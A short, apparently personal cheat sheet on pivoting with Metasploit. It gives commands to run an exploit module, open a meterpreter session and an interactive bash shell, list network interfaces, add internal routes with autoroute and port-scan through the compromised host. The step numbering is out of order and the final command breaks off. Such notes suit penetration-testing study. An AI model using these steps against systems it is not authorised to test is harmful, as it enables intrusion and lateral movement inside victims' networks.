1. Run the module
```bash
msf> run or exploit
```

2. Get meterpreter shell and check if session created and info about victim
```bash
meterpreter> sysinfo
```

3. Spawn shell session so we get usual commands
```bash
meterpreter> shell   # Spawn normal shell
meterpreter> /bin/bash -i # Convert to interactive bash session
```

4. Check possible internal network connections
```bash
ip a 
ifconfig
```

5. step out of interactive shell and add internal ip to routes
```bash
meterpreter> run autoroute -s INTERNAL_IP_ADDR    # Add Subnet route to targets
```

8. Background session 
```bash
meterpreter> background
```

6. Port scan original target, to rebound on set route
```bash
msf> search portscan
msf> use auxiliary/scanner/portscan/tcp
msf> set 
```